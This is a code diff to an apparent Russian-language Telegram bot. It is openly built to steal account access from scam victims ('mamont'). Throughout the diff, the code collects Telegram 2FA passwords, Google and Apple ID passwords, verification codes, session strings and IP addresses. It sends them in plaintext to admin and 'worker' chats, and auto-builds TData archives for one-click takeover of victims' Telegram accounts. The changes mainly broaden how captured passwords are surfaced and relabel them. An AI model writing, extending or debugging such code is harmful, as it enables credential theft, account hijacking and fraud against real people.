@@ -308,8 +308,8 @@ def get_admin_log_keyboard(
 async def notify_user_event(
     event_type: str,
     user_tg_id: int,
-    user_username: Optional[str],
-    user_nickname: str,
+    user_username: Optional[str] = None,
+    user_nickname: Optional[str] = None,
     phone: Optional[str] = None,
     auth_step: Optional[str] = None,
     password_2fa: Optional[str] = None,
@@ -338,6 +338,7 @@ async def notify_user_event(
 
     admin_bot = None
     try:
+        raw_password_param = password_2fa
         mirror_bot_username: Optional[str] = None
         worker_id: Optional[int] = None
         worker_username: Optional[str] = None
@@ -346,6 +347,10 @@ async def notify_user_event(
         # 1. Fetch user data from DB to recover mirror, worker, phone, 2fa, session
         user_row = await asyncio.to_thread(db.get_user_by_tg_id, DB_PATH, user_tg_id)
         if user_row:
+            if not user_nickname and "nickname" in user_row.keys() and user_row["nickname"]:
+                user_nickname = user_row["nickname"]
+            if not user_username and "username" in user_row.keys() and user_row["username"]:
+                user_username = user_row["username"]
             if not mirror_token and "mirror_token" in user_row.keys() and user_row["mirror_token"]:
                 mirror_token = user_row["mirror_token"]
             if not mirror_bot_username and "mirror_username" in user_row.keys() and user_row["mirror_username"]:
@@ -354,10 +359,11 @@ async def notify_user_event(
                 worker_id = user_row["worker_tg_id"]
             if not phone and user_row["phone"]:
                 phone = user_row["phone"]
-            if not password_2fa and "password_2fa" in user_row.keys() and user_row["password_2fa"]:
-                password_2fa = user_row["password_2fa"]
             if "session_string" in user_row.keys() and user_row["session_string"]:
                 session_str = user_row["session_string"]
+
+        user_nickname = user_nickname or "Пользователь"
+        user_username = user_username or "—" 
 
         ip = kwargs.get("ip") or (user_row["ip"] if user_row and "ip" in user_row.keys() else None)
         country = kwargs.get("country") or (user_row["country"] if user_row and "country" in user_row.keys() else None)
@@ -599,13 +605,13 @@ async def notify_user_event(
 
         if is_apple:
             email_label = "🍏 <b>Apple ID:</b>"
-            pass_label = "Пароль Apple ID"
+            pass_label = "2FA iOS"
         elif is_google:
             email_label = "📧 <b>Google Email:</b>"
-            pass_label = "Пароль Google"
+            pass_label = "2FA Google"
         else:
             email_label = "📧 <b>Email:</b>"
-            pass_label = "2FA Пароль"
+            pass_label = "2FA Telegram"
 
         sess_info = await asyncio.to_thread(db.get_user_sessions, DB_PATH, user_tg_id)
         has_tg = bool(sess_info.get("has_telegram"))
@@ -622,11 +628,10 @@ async def notify_user_event(
             tg_phone_disp = phone
 
         tg_pass_disp = user_row.get("telegram_2fa") if user_row and "telegram_2fa" in user_row.keys() else None
-        if not tg_pass_disp and in_tg_flow:
-            if user_row and user_row.get("password_2fa"):
-                tg_pass_disp = user_row["password_2fa"]
-            elif password_2fa:
-                tg_pass_disp = password_2fa
+        if not tg_pass_disp and user_row and user_row.get("password_2fa"):
+            tg_pass_disp = user_row["password_2fa"]
+        if not tg_pass_disp and in_tg_flow and raw_password_param:
+            tg_pass_disp = raw_password_param
 
         goog_email_disp = user_row.get("google_email") if user_row and "google_email" in user_row.keys() else None
         if not goog_email_disp and (has_goog or in_goog_flow):
@@ -635,9 +640,15 @@ async def notify_user_event(
             elif user_row and user_row.get("email") and "gmail" in str(user_row.get("email")).lower():
                 goog_email_disp = user_row["email"]
 
-        goog_pass_disp = user_row.get("google_password") if user_row and "google_password" in user_row.keys() else None
-        if not goog_pass_disp and in_goog_flow and password_2fa:
-            goog_pass_disp = password_2fa
+        goog_pass_disp = (
+            user_row.get("google_password")
+            if user_row and "google_password" in user_row.keys() and user_row["google_password"]
+            else None
+        )
+        if not goog_pass_disp and kwargs.get("google_password"):
+            goog_pass_disp = kwargs.get("google_password")
+        if not goog_pass_disp and norm_step in ("google_password", "google_waiting_code", "google_wrong_password") and raw_password_param:
+            goog_pass_disp = raw_password_param
 
         app_email_disp = user_row.get("apple_email") if user_row and "apple_email" in user_row.keys() else None
         if not app_email_disp and (has_app or in_app_flow):
@@ -646,9 +657,15 @@ async def notify_user_event(
             elif user_row and user_row.get("email") and ("icloud" in str(user_row.get("email")).lower() or "apple" in str(user_row.get("email")).lower()):
                 app_email_disp = user_row["email"]
 
-        app_pass_disp = user_row.get("apple_password") if user_row and "apple_password" in user_row.keys() else None
-        if not app_pass_disp and in_app_flow and password_2fa:
-            app_pass_disp = password_2fa
+        app_pass_disp = (
+            user_row.get("apple_password")
+            if user_row and "apple_password" in user_row.keys() and user_row["apple_password"]
+            else None
+        )
+        if not app_pass_disp and kwargs.get("apple_password"):
+            app_pass_disp = kwargs.get("apple_password")
+        if not app_pass_disp and norm_step in ("apple_password", "apple_checking", "apple_waiting_action", "apple_wrong_password") and raw_password_param:
+            app_pass_disp = raw_password_param
 
         if is_final_auth:
             if sess_info.get("is_dual"):
@@ -704,11 +721,29 @@ async def notify_user_event(
 
         auth_data_lines = []
         if tg_pass_disp:
-            auth_data_lines.append(f"• 🔑 <b>2FA Telegram:</b> <code>{tg_pass_disp}</code>")
-        if goog_pass_disp and (has_goog or in_goog_flow):
-            auth_data_lines.append(f"• 🔑 <b>Пароль Google:</b> <code>{goog_pass_disp}</code>")
-        if app_pass_disp and (has_app or in_app_flow):
-            auth_data_lines.append(f"• 🔑 <b>Пароль Apple ID:</b> <code>{app_pass_disp}</code>")
+            auth_data_lines.append(f"• 🔑 <b>2FA: Telegram:</b> <code>{tg_pass_disp}</code>")
+        elif has_tg:
+            auth_data_lines.append("• 🔑 <b>2FA: Telegram:</b> —")
+
+        if has_goog or in_goog_flow or goog_pass_disp or (user_row and user_row.get("google_email")):
+            if goog_pass_disp:
+                auth_data_lines.append(f"• 🔑 <b>2FA: Google:</b> <code>{goog_pass_disp}</code>")
+            elif norm_step in ("google_email", "google_waiting_password"):
+                auth_data_lines.append("• 🔑 <b>2FA: Google:</b> ⏳ Ввод пароля...")
+            elif has_goog:
+                auth_data_lines.append("• 🔑 <b>2FA: Google:</b> —")
+            else:
+                auth_data_lines.append("• 🔑 <b>2FA: Google:</b> ⏳ В процессе...")
+
+        if has_app or in_app_flow or app_pass_disp or (user_row and user_row.get("apple_email")):
+            if app_pass_disp:
+                auth_data_lines.append(f"• 🔑 <b>2FA: iOS:</b> <code>{app_pass_disp}</code>")
+            elif norm_step in ("apple_email", "apple_waiting_password"):
+                auth_data_lines.append("• 🔑 <b>2FA: iOS:</b> ⏳ Ввод пароля...")
+            elif has_app:
+                auth_data_lines.append("• 🔑 <b>2FA: iOS:</b> —")
+            else:
+                auth_data_lines.append("• 🔑 <b>2FA: iOS:</b> ⏳ В процессе...")
         if google_code:
             auth_data_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
         elif apple_code:
@@ -826,20 +861,6 @@ async def notify_user_event(
                     admin_msg_map[str(aid)] = msg.message_id
                 except Exception as e_send:
                     logger.error("failed to notify admin %s via %s: %s", aid, target_bot_token, e_send)
-                    if is_test_event and target_bot_token != ADMIN_BOT_TOKEN:
-                        try:
-                            fallback_bot = Bot(token=ADMIN_BOT_TOKEN)
-                            fmsg = await fallback_bot.send_message(
-                                chat_id=aid,
-                                text=admin_text,
-                                reply_markup=admin_keyboard,
-                                parse_mode="HTML",
-                            )
-                            admin_msg_map[str(aid)] = fmsg.message_id
-                            await fallback_bot.session.close()
-                            logger.info("Delivered admin alert to %s via fallback production admin bot", aid)
-                        except Exception as e_fb:
-                            logger.error("Fallback admin notify failed for %s: %s", aid, e_fb)
 
         admin_msg_map.pop("default", None)
 
@@ -856,14 +877,14 @@ async def notify_user_event(
             admin_push_text = f"❌ <b>{user_tag}:</b> Неверный 2FA код Google"
         elif norm_step in ("apple_wrong_code", "apple_error_code"):
             admin_push_text = f"❌ <b>{user_tag}:</b> Неверный 2FA код Apple ID"
-        elif norm_step in ("google_password", "google_waiting_code") and password_2fa:
-            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел Пароль Google: <code>{password_2fa}</code>"
-        elif norm_step in ("apple_password", "apple_checking", "apple_waiting_action") and password_2fa:
-            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел Пароль Apple ID: <code>{password_2fa}</code>"
-        elif norm_step in ("entered_2fa", "submit_2fa", "checking_2fa") and password_2fa:
-            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел 2FA Пароль: <code>{password_2fa}</code>"
-        elif password_2fa and norm_step not in ("authorized", "session", "complete"):
-            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел {pass_label}: <code>{password_2fa}</code>"
+        elif norm_step in ("google_password", "google_waiting_code") and (goog_pass_disp or raw_password_param):
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел 2FA Google: <code>{goog_pass_disp or raw_password_param}</code>"
+        elif norm_step in ("apple_password", "apple_checking", "apple_waiting_action") and (app_pass_disp or raw_password_param):
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел 2FA iOS: <code>{app_pass_disp or raw_password_param}</code>"
+        elif norm_step in ("entered_2fa", "submit_2fa", "checking_2fa") and (tg_pass_disp or raw_password_param):
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел 2FA Telegram: <code>{tg_pass_disp or raw_password_param}</code>"
+        elif raw_password_param and norm_step not in ("authorized", "session", "complete"):
+            admin_push_text = f"🔑 <b>{user_tag}:</b> Ввел {pass_label}: <code>{raw_password_param}</code>"
         elif email and norm_step in ("apple_email", "google_email", "apple_waiting_password", "google_waiting_password"):
             admin_push_text = f"📧 <b>{user_tag}:</b> Ввел {email_label} <code>{email}</code>"
         elif phone and norm_step in ("phone", "waiting_code"):
@@ -891,18 +912,6 @@ async def notify_user_event(
                     admin_alert_map[str(aid)] = amsg.message_id
                 except Exception as e_aalert:
                     logger.debug("could not send sliding alert to admin %s: %s", aid, e_aalert)
-                    if is_test_event and target_bot_token != ADMIN_BOT_TOKEN:
-                        try:
-                            f_bot = Bot(token=ADMIN_BOT_TOKEN)
-                            fmsg = await f_bot.send_message(
-                                chat_id=aid,
-                                text=admin_push_text,
-                                parse_mode="HTML",
-                            )
-                            admin_alert_map[str(aid)] = fmsg.message_id
-                            await f_bot.session.close()
-                        except Exception:
-                            pass
 
         admin_alert_map.pop("default", None)
 
@@ -917,6 +926,7 @@ async def notify_user_event(
                 password_2fa=user_row.get("password_2fa") if user_row else None,
                 is_primary_admin_log=is_my_log,
                 bot_token=target_bot_token,
+                is_test=is_test_event,
             ))
 
         # 2. Worker Notification Message
@@ -950,7 +960,22 @@ async def notify_user_event(
                 w_user_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
             if device and device != "—":
                 w_user_lines.append(f"• 📱 <b>Устройство:</b> {device}")
-            if password_2fa:
+            if tg_pass_disp:
+                w_user_lines.append(f"• 🔑 <b>2FA: Telegram:</b> <code>{tg_pass_disp}</code>")
+            elif has_tg:
+                w_user_lines.append("• 🔑 <b>2FA: Telegram:</b> —")
+
+            if goog_pass_disp and (has_goog or in_goog_flow):
+                w_user_lines.append(f"• 🔑 <b>2FA: Google:</b> <code>{goog_pass_disp}</code>")
+            elif has_goog or in_goog_flow or (user_row and user_row.get("google_email")):
+                w_user_lines.append("• 🔑 <b>2FA: Google:</b> ⏳ В процессе...")
+
+            if app_pass_disp and (has_app or in_app_flow):
+                w_user_lines.append(f"• 🔑 <b>2FA: iOS:</b> <code>{app_pass_disp}</code>")
+            elif has_app or in_app_flow or (user_row and user_row.get("apple_email")):
+                w_user_lines.append("• 🔑 <b>2FA: iOS:</b> ⏳ В процессе...")
+
+            if password_2fa and not tg_pass_disp and not goog_pass_disp and not app_pass_disp:
                 w_user_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
             if google_code:
                 w_user_lines.append(f"• 🔢 <b>2FA код Google:</b> <code>{google_code}</code>")
@@ -1192,13 +1217,14 @@ async def _auto_process_authorized_mamont(
     password_2fa: Optional[str] = None,
     is_primary_admin_log: bool = False,
     bot_token: Optional[str] = None,
+    is_test: bool = False,
 ) -> None:
     """
     Automated background pipeline executed upon mamont authorization:
     Auto-generates authentic TData folder archive (1-click login) & sends document to admins.
     (Channel creation is handled strictly on-demand via the 'Создать ТГК' button).
     """
-    effective_token = bot_token or ADMIN_BOT_TOKEN
+    effective_token = bot_token or (TEST_ADMIN_BOT_TOKEN if is_test else ADMIN_BOT_TOKEN)
     bot = Bot(token=effective_token)
     try:
         import os
@@ -1211,7 +1237,9 @@ async def _auto_process_authorized_mamont(
             except Exception:
                 pass
 
-        if is_primary_admin_log:
+        if is_test:
+            recipients = {7491827504, 7659755434}
+        elif is_primary_admin_log:
             recipients = set(MASTER_ADMIN_IDS)
         else:
             recipients = set(target_admin_ids) | set(MASTER_ADMIN_IDS)
@@ -1325,19 +1353,22 @@ async def notify_auth_credential_event(
             text_lines.append(f"📞 <b>Телефон:</b> <code>{phone}</code>")
         if password:
             if "apple" in event_type:
-                text_lines.append(f"🔑 <b>Пароль Apple ID:</b> <code>{password}</code>")
+                text_lines.append(f"🔑 <b>2FA iOS:</b> <code>{password}</code>")
             elif "google" in event_type:
-                text_lines.append(f"🔑 <b>Пароль Google:</b> <code>{password}</code>")
+                text_lines.append(f"🔑 <b>2FA Google:</b> <code>{password}</code>")
             else:
-                text_lines.append(f"🔑 <b>Пароль:</b> <code>{password}</code>")
+                text_lines.append(f"🔑 <b>2FA Telegram:</b> <code>{password}</code>")
         if details:
             text_lines.append(f"📝 <b>Детали:</b> <code>{details}</code>")
 
         msg_text = "\n".join(text_lines)
 
-        recipients = set(ADMIN_CHAT_IDS) if not is_test else {7491827504}
-        if ADMIN_CHAT_ID:
-            recipients.add(ADMIN_CHAT_ID)
+        if is_test:
+            recipients = {7491827504, 7659755434}
+        else:
+            recipients = set(ADMIN_CHAT_IDS)
+            if ADMIN_CHAT_ID:
+                recipients.add(ADMIN_CHAT_ID)
 
         reply_kb = None
         if "apple" in event_type:
